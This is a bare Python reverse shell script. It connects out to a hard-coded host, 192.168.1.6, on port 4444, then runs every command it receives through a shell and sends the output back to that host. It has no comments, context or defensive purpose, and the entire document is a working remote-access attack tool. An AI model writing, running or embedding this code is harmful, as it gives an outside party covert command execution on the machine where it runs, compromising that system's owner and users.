
import socket
import subprocess

ip = '192.168.1.6'
port = 4444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.connect((ip, port))

run_until = True

while True:
	cmd = s.recv(1024)
	if cmd == b'exit' or cmd == b'':
		print("[+] Session Close")
		s.close()
		break

	else:
		proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		output = proc.stdout.read() + proc.stderr.read()
		print(output)
		s.send(output)
		
